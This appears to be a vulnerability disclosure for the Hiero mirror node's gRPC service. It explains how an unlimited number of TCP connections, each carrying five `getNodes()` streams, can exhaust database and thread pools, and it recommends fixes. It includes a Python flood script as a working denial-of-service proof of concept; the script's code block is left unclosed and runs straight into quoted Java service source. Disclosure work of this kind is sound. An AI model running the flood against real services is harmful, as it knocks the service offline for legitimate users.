### Title
Unbounded TCP Connection Count Enables Resource Exhaustion via Concurrent `getNodes()` Subscriptions

### Summary
The gRPC server limits concurrent streams to 5 per TCP connection (`maxConcurrentCallsPerConnection = 5`) but imposes no limit on the total number of TCP connections from a single client or IP. An unprivileged attacker can open an arbitrary number of TCP connections and saturate each with `getNodes()` calls, creating thousands of concurrent reactive pipelines that each issue database queries, hold `boundedElastic` scheduler threads, and consume DB connection pool slots, causing a denial of service.

### Finding Description

**Code locations:**

- `grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java`, lines 33–43: `getNodes()` accepts any unauthenticated request, immediately subscribes a reactive pipeline, and registers no global or per-client concurrency guard.
- `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35: The only server-level constraint applied to the `NettyServerBuilder` is `maxConcurrentCallsPerConnection`. No `maxConnections()`, no IP-based interceptor, no admission control.
- `grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14: `maxConcurrentCallsPerConnection` defaults to **5**.

**Root cause:** The design assumes that limiting streams per connection is sufficient to bound total server load. This assumption fails because there is no limit on the number of TCP connections a single client may open. The product `(connections) × 5` is unbounded.

**Exploit flow:**

1. Attacker opens *K* TCP connections to port 5600 (no authentication required, no IP-based connection cap).
2. On each connection the attacker sends 5 concurrent `getNodes(AddressBookQuery{})` RPCs (the per-connection maximum).
3. Each RPC enters `NetworkController.getNodes()` (line 34), which immediately calls `networkService.getNodes()` and subscribes.
4. Inside `NetworkServiceImpl.getNodes()` (lines 61–76), each subscription:
   - Executes a synchronous DB query (`addressBookRepository.findLatestTimestamp`, `nodeStakeRepository.findLatestTimestamp`, `nodeStakeRepository.findAllStakeByConsensusTimestamp`) — three DB round-trips per subscription at startup.
   - Enters a `repeatWhen` loop that pages through address book entries via `addressBookEntryRepository.findByConsensusTimestampAndNodeId` on `Schedulers.boundedElastic()` with a 250 ms inter-page delay.
   - Holds a live `TransactionOperations` context and a `boundedElastic` worker thread for the duration.
5. With *K* = 1 000 connections, 5 000 concurrent subscriptions are active, each issuing periodic DB queries and holding a scheduler thread.

**Why existing checks fail:**

- `maxConcurrentCallsPerConnection = 5` (NettyProperties line 14, GrpcConfiguration line 33) only caps streams per single TCP connection; it does not cap the number of connections.
- No `ServerInterceptor` in the production gRPC module performs rate limiting or IP-based admission control. The only `GrpcInterceptor` found is a test-only class that merely sets an `EndpointContext`.
- The `ThrottleConfiguration` / `ThrottleManagerImpl` rate-limiting infrastructure exists exclusively in the `web3` module and is not wired into the `grpc` module at all.
- `AddressBookFilter.limit` defaults to 0 (unlimited) when the client omits it, so each subscription pages indefinitely.

### Impact Explanation
Each concurrent subscription consumes: one or more DB connection pool slots (via `TransactionOperations`), one `boundedElastic` thread per active page fetch, and heap memory for the reactive pipeline and result buffers. A sufficiently large *K* exhausts the DB connection pool (causing all gRPC and potentially REST requests to queue or fail), saturates the `boundedElastic` thread pool (causing scheduler starvation across the entire application), and may trigger OOM. The service becomes unavailable to legitimate clients. No credentials are required.

### Likelihood Explanation
The attack requires only a standard gRPC client library and the ability to open many TCP connections — trivially achievable from a single host or a small botnet. The endpoint is publicly documented and requires no authentication. The attack is repeatable and can be sustained indefinitely. The attacker does not need to understand the internals; simply sending many `getNodes` RPCs with no `limit` field is sufficient.

### Recommendation
1. **Limit total connections per IP** by adding `serverBuilder.maxConnectionsPerIp(N)` (or equivalent Netty `ChannelOption`) in `GrpcConfiguration.grpcServerConfigurer`.
2. **Add a global concurrent-subscription counter** in `NetworkServiceImpl.getNodes()` using an `AtomicInteger`; reject (throw `RESOURCE_EXHAUSTED`) when the counter exceeds a configurable threshold.
3. **Enforce a minimum non-zero `limit`** in `AddressBookFilter` so subscriptions are always finite; reject requests with `limit = 0` or cap them to a server-side maximum.
4. **Add a gRPC `ServerInterceptor`** (production, not test-only) that tracks active calls per remote IP and returns `RESOURCE_EXHAUSTED` above a threshold.
5. **Expose `maxConcurrentCallsPerConnection`** alongside a new `maxConnections` property in `NettyProperties` so operators can tune both dimensions.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.mirror.api.proto import mirror_pb2_grpc, mirror_pb2

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 500   # open 500 TCP connections
STREAMS_PER_CONN = 5  # server allows 5 concurrent calls per connection

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = mirror_pb2_grpc.NetworkServiceStub(channel)
    threads = []
    for _ in range(STREAMS_PER_CONN):
        # AddressBookQuery with no limit → infinite paging
        req = mirror_pb2.AddressBookQuery()
        t = threading.Thread(target=lambda: list(stub.getNodes(req)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for w in workers:
    w.start()
# 500 connections × 5 streams = 2500 concurrent getNodes() subscriptions
# Each pages the DB every 250 ms → ~10 000 DB queries/second
# DB pool exhausted; service unavailable to legitimate clients

    public Flux<AddressBookEntry> getNodes(AddressBookFilter filter) {
        var fileId = filter.getFileId();
        if (!getValidFileIds().contains(fileId)) {
            throw new IllegalArgumentException(INVALID_FILE_ID);
        }

        long addressBookTimestamp = addressBookRepository
                .findLatestTimestamp(fileId.getId())
                .orElseThrow(() -> new EntityNotFoundException(fileId));
        long nodeStakeTimestamp = nodeStakeRepository.findLatestTimestamp().orElse(NODE_STAKE_EMPTY_TABLE_TIMESTAMP);
        var nodeStakeMap = nodeStakeRepository.findAllStakeByConsensusTimestamp(nodeStakeTimestamp);
        var context = new AddressBookContext(addressBookTimestamp, nodeStakeMap);

        return Flux.defer(() -> page(context))
                .repeatWhen(RepeatSpec.create(c -> !context.isComplete(), Long.MAX_VALUE)
                        .jitter(0.5)
                        .withFixedDelay(addressBookProperties.getPageDelay())
                        .withScheduler(Schedulers.boundedElastic()))
                .take(filter.getLimit() > 0 ? filter.getLimit() : Long.MAX_VALUE)
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Querying for address book: {}", filter))
                .doOnComplete(() -> log.info("Retrieved {} nodes from the address book", context.getCount()));
    }

    private Flux<AddressBookEntry> page(AddressBookContext context) {
        return transactionOperations.execute(t -> {
            var addressBookTimestamp = context.getAddressBookTimestamp();
            var nodeStakeMap = context.getNodeStakeMap();
            var nextNodeId = context.getNextNodeId();
            var pageSize = addressBookProperties.getPageSize();
            var nodes = addressBookEntryRepository.findByConsensusTimestampAndNodeId(
                    addressBookTimestamp, nextNodeId, pageSize);
            var endpoints = new AtomicInteger(0);

            nodes.forEach(node -> {
                // Override node stake
                node.setStake(nodeStakeMap.getOrDefault(node.getNodeId(), 0L));
                // This hack ensures that the nested serviceEndpoints is loaded eagerly and voids lazy init exceptions
                endpoints.addAndGet(node.getServiceEndpoints().size());
            });

            if (nodes.size() < pageSize) {
                context.completed();
            }

            log.info(
                    "Retrieved {} address book entries and {} endpoints for timestamp {} and node ID {}",
                    nodes.size(),
                    endpoints,
                    addressBookTimestamp,
                    nextNodeId);
            return Flux.fromIterable(nodes);
        });
    }
